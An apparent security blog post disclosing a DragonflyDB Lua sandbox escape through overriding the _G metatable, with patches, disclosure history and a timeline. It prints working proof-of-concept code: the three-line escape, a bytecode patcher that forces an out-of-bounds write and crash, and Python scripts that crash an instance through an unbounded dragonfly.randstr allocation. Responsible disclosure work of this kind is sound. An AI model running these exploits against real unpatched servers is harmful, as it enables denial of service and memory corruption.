---
layout: post
category: Security
title: "DragonflyDB Lua sandbox escape via getmetatable(_G) metatable override"
heading: "DragonflyDB Lua sandbox escape via getmetatable(_G) metatable override"
description: "A full Lua sandbox escape in DragonflyDB via getmetatable(_G) metatable override, the escalations it opens up, and an unbounded-allocation DoS in dragonfly.randstr. Affected: all versions before v1.39.0. Patched: v1.39.0."
---

## TLDR:

- A full Lua sandbox escape in DragonflyDB, a protection-mechanism failure (CWE-693). Three lines overwrite the `_G` metatable and hand back `rawset`, `rawget`, `string.dump`, `load`, and the rest of what the sandbox tries to hide.
- The only thing you need is the ability to run `EVAL`.
- From there it chains: call registered C functions with controlled args, leak pointers via `tostring`, and force an out-of-bounds write (CWE-787), a reliable SIGSEGV, through a crafted-bytecode `SETUPVAL` index.
- Separate bug, same file: `dragonfly.randstr` has no size check (CWE-789). `return dragonfly.randstr(1000000000)` allocates gigabytes and drops the instance.
- Where it stops: no OS-level RCE. `io` and `os` aren't loaded and nothing dangerous is registered to Lua, a deliberate call by the team, and the only reason this isn't worse.
- **Affected:** everything before v1.39.0 (verified v1.34.2–v1.38.1 + main).
- **Patched:** v1.39.0, 9 June 2026.
- **Running `EVAL` anywhere untrusted? Upgrade to v1.39.0, or gate `EVAL`/`EVALSHA` behind ACLs until you can.**

---

## Background

I'd been reading Dragonfly's source on a weekend, mostly because I wanted to
see how a from-scratch Redis-compatible server handles scripting and how I
could abuse it. Redis style `EVAL` is one of those features that looks small
from the outside and is a whole lot more intersting when you look at it more:
you're handing an attacker a real programming language and then trying to fence
off the dangerous parts of it after the fact. This sort of thing is done a lot
with vendored versions of databases. They often have fun things inside that can
be dangerous to the owner of the server if they let a user play too much, think
Postgres's `lo_import`.

Dragonfly fences it with a metatable. When the interpreter spins up, `InitLua`
loads a handful of libraries (base, table, string, math, debug, plus
cjson/struct/cmsgpack/bit), and then runs a small Lua chunk it calls
`@enable_strict_lua` to lock the global table down. That chunk is the whole
sandbox for global access, and it lives in `src/core/interpreter.cc` around
lines 386–407:

```lua
local dbg=debug
local mt = {}

setmetatable(_G, mt)
mt.__newindex = function (t, n, v)
  if dbg.getinfo(2) then
    local w = dbg.getinfo(2, "S").what
    if w ~= "main" and w ~= "C" then
      error("Script attempted to create global variable '"..tostring(n).."'", 2)
    end
  end
  rawset(t, n, v)
end
mt.__index = function (t, n)
  if dbg.getinfo(2) and dbg.getinfo(2, "S").what ~= "C" then
    error("Script attempted to access nonexistent global variable '"..tostring(n).."'", 2)
  end
  return rawget(t, n)
end
debug = nil
```

Take a second look at that code block... The protection is two closures on the
`_G` metatable. `__newindex` stops you creating globals, `__index` stops you
reading globals that don't exist. After it's set up, `debug` is nil'd, and
elsewhere `loadfile` and `dofile` get nil'd too.

Two things never get taken away: `rawset` and `getmetatable`. And the metatable
`mt` is a plain table sitting one `getmetatable` call away.

That's the bug. The lock and the key are in the same drawer!!

---

## The escape

`getmetatable(_G)` returns `mt`. `rawset` is still global. So you write
straight over the two guard closures with permissive ones and because
`rawset` bypasses metatables, the existing `__newindex` guard can't even fire
to stop you:

```lua
local mt = getmetatable(_G)
rawset(mt, "__newindex", function(t,n,v) rawset(t,n,v) end)
rawset(mt, "__index", function(t,n) return rawget(t,n) end)
```

Three lines and after that the global creation and global reads are wide open,
and the functions the sandbox was relying on staying hidden are all reachable.

Here is a quick check that I ran to test it:

```lua
rawset(_G, "TEST", 123)
local bc = string.dump(function() return 1 end)
local f = load(bc, "test", "b")
```

`string.dump` gives you compiled bytecode. `load(..., "b")` reads compiled
bytecode back. Both are right there once the guards are gone. This is the core
issue (a protection-mechanism failure, CWE-693) and everything below relies on
this.

None of this is new code, either. That metatable approach has been Dragonfly's
Lua sandbox since the earliest public builds, and `dragonfly.randstr` has been
around since roughly v1.15.0. So "affected" is basically every release before
v1.39.0. I verified it from v1.34.2 through v1.38.1 (the latest tagged release
at report time) and main, and v1.38.1 still ships the unpatched version.

---

## What the bypass opens up

Once you're out, a few different things open up to you. None of them is the
headline (the headline is that you're out at all), but they're worth walking
through because they're the next reach and they map onto what got patched.

**C function injection / type confusion.** Functions are first class in Lua,
and after the escape you have references to the registered C functions. You can
park them in table slots and call them with whatever arguments you like:

```lua
T = {1, 2, 3}
T[2] = type             -- a C function, now living in a table slot
result = T[2]("hello")  -- "string"
-- same trick works with tostring, rawget, select, and other friends
```

On its own that's just calling builtins. The part that matters for anyone
trying to go further: `tostring` on a function hands back the pointer as text,
so this is also a memory address leak past ASLR. Hold that thought for the
Where it stops section.

**Bytecode manipulation and an out-of-bounds write (CWE-787).** With
`string.dump` and `load` both reachable you can round-trip bytecode through
your own patcher. The Lua VM doesn't validate the `SETUPVAL` index coming out
of loaded bytecode, so a negative index is an out-of-bounds write. Easiest way
to see it is to dump a closure, find the `SETUPVAL` instruction, and rewrite
its index:

```lua
local function template()
  local x = 0xDEAD
  return function()
    x = 0x16
  end
end

local bc = string.dump(template)

-- Patch the SETUPVAL instruction to use a negative index (OOB write)
for i = 40, #bc - 4 do
  local inst = string.unpack("<I4", bc, i)
  if (inst & 0x7F) == 0x18 then
    inst = (inst & 0x7FFF) | (0xFF << 15)
    bc = bc:sub(1, i-1) .. string.pack("<I4", inst) .. bc:sub(i+4)
    break
  end
end

local f = load(bc, "oob", "b")
local inner = f()
inner()  -- writes 0x16 to memory at the upvalue[-1] location
```

That's a write where it shouldn't be, and it'll take the process down with a
SIGSEGV. It is a crash/OOB-write primitive, not a controlled-write-to-anything
primitive. More on why in a moment.

**Multi-EVAL state persistence.** Globals survive across `EVAL` commands on the
same connection. So you don't have to cram the whole thing into one script; you
can set up the escape in one call and use it in the next:

```python
import redis
r = redis.Redis(host='target', port=6379, password='xxx')

# EVAL 1: escape the sandbox & leave a global behind
r.eval('''
local mt = getmetatable(_G)
rawset(mt, "__newindex", function(t,n,v) rawset(t,n,v) end)
rawset(mt, "__index", function(t,n) return rawget(t,n) end)
EXPLOIT_STATE = {step = 1}
''', 0)

# EVAL 2: the global is still there
result = r.eval('return EXPLOIT_STATE.step', 0)  # 1
```

That's a delivery convenience more than a bug of its own, but it changes what
an attacker has to fit in a single payload, so I flagged it. Though it does not
achive much at all.

---

## Where it stops

This is the part I want to be straight up about, because it's most of the work
and none of the win.

I tried real hard to take the OOB write and the C-function reach somewhere real
something like a rce or anything more than what it is right now. I threw more
than 4.2 billion fuzzing attempts at the `SETUPVAL` OOB alone over multiple
nights, looking for a path from "negative index write" to controlled execution.
I got crashes. Left right an centre, just crashes. I got pointer leaks out of
`tostring`. I did not get OS level RCE, and I'm fairly confident it isn't there
from this surface.

The reason is boring and it's the right kind of boring: `io` and `os` are never
loaded into the Lua state, and nothing like `popen` is registered. So the
type-confusion / C-function-call trick has nothing dangerous to reach. You can
call `type` and `tostring` all day yay... There just is no `os.execute` sitting
in the registry to find. The dangerous primitives that would normally turn a
Lua sandbox escape into a shell just aren't present.

So: full sandbox escape, a memory-corruption crash, an address leak, and a
bloody brick wall past that, put there on purpose. Credit where it's due. That
defense-in-depth call is the difference between this and a much worse report.

---

## The DoS

Different bug, same file, no escape required. `dragonfly.randstr`
(`src/core/interpreter.cc`, around 467–506) reads its size argument and
allocates straight away with no upper bound:

```cpp
int DragonflyRandstrCommand(lua_State* state) {
  int argc = lua_gettop(state);
  lua_Integer dsize = lua_tonumber(state, 1);
  lua_remove(state, 1);

  std::string buf(dsize, ' ');
  ...
```

`dsize` comes from the script, `std::string buf(dsize, ' ')` tries to allocate
that many bytes. One command, gigabytes requested, instance gone:

```python
import redis
r = redis.Redis(host='target', port=6379, password='xxx', socket_timeout=5)

try:
  r.eval('return dragonfly.randstr(1000000000)', 0)
except redis.exceptions.TimeoutError:
  print("Service crashed")
```

That's CWE-789, a memory allocation sized straight from an unvalidated
argument. It needs `EVAL` and nothing else.

---

## The fix

The fixes were already going up in the repo before I'd even had a human reply
(more on the timeline below). Three PRs cover it, all landed in v1.39.0:

- **PR #7370: sandbox hardening.** `rawset`, `setmetatable`, and `getmetatable` are now overridden to block access to `_G` and the global library tables, and guard metatables are attached so scripts can't replace or corrupt them across executions. This is the one that actually closes the escape: take `rawset` and `getmetatable` off the table and the three-line trick has nothing to grab.
  - Worth a note: the automated review on that PR flagged that an early version of the guard still let you mutate the returned metatable's fields directly (`mt.__newindex = nil` via a normal table assignment rather than `rawset`). Same shape as the original bug, one rung down. That's why the shipped fix also pins guard metatables onto the global tables instead of only wrapping `rawset`. Good catch by whoever was reviewing.
- **PR #7368: randstr validation.** Argument count, type, and size are now checked (count 1–32768, size 1–16 MiB). The unbounded `std::string` allocation is gone.
- **PR #7376: load restricted to text-only.** `load` is wrapped to force mode `"t"` and returns nil for any binary input regardless of the mode the caller asks for. That kills the bytecode path specifically: you can still escape into `load` in theory, but you can't feed it crafted compiled bytecode anymore, so the `SETUPVAL` trick has no way in.

If you want the one-line version: v1.39.0 takes away the keys
(`rawset`/`getmetatable`), bolts the bytecode door (`load` text-only), and
bounds the allocation (`randstr`).

---

## Disclosure

I emailed the Dragonfly team on 18 May with the escape, the escalations off it,
and the `randstr` DoS, noting I'd verified everything on v1.34.2 through
v1.38.1 and main at `baa09014`. I offered to validate a patch once they had
one.

The email side was quiet. Ari Shotland picked it up on 21 May and pulled in
Roman Gershman, their CTO. Roman's reply, in full, was "Thanks for letting us
know!" :)

Normally that's the kind of response that makes you wonder if anything's
happening. It wasn't. The patches had started going up on the 20th. PR #7368
and PR #7370 were both open a day before the first human reply, and #7376 went
up on the 21st. Quiet on email, fast in the repo. I'll take that over the
reverse any day.

v1.39.0 shipped on 9 June with all three fixes folded into a big release (the
Lua hardening is a few lines in a changelog that's mostly full-text search
work). On 10 June I asked Roman whether the team planned to request a CVE, and
whether I was clear to write this up. He said go ahead on the blog and offered
to help with the CVE. That part's still in motion. I'm working out whether to
drive it through a GitHub advisory or straight through MITRE.

---

## Timeline

- 18 May 2026: Reported the Lua sandbox escape, the escalations, and the `randstr` DoS to the Dragonfly team. Verified on v1.34.2–v1.38.1 and main (`baa09014`).
- 20 May 2026: Fixes start landing: PR #7368 (randstr validation) and PR #7370 (sandbox hardening) opened.
- 21 May 2026: Ari Shotland replied and looped in Roman Gershman (CTO). PR #7376 (load text-only) opened the same day.
- 22 May 2026: Roman acknowledged: "Thanks for letting us know!"
- 9 June 2026: v1.39.0 released, bundling all three Lua fixes.
- 10 June 2026: Confirmed with Roman that I could write this up; CVE still being sorted (GitHub advisory vs MITRE).

---

## Appendix A: Resources

- [PR #7370: Harden sandbox by protecting rawset, setmetatable, and getmetatable](https://github.com/dragonflydb/dragonfly/pull/7370)
- [PR #7368: Add input size validation to dragonfly.randstr()](https://github.com/dragonflydb/dragonfly/pull/7368)
- [PR #7376: Restrict load() to text-only mode](https://github.com/dragonflydb/dragonfly/pull/7376)
- [Dragonfly v1.39.0 release](https://github.com/dragonflydb/dragonfly/releases/tag/v1.39.0)
- Vulnerable file: `src/core/interpreter.cc` (sandbox init ~386–407, `dragonfly.randstr` ~467–506)

---
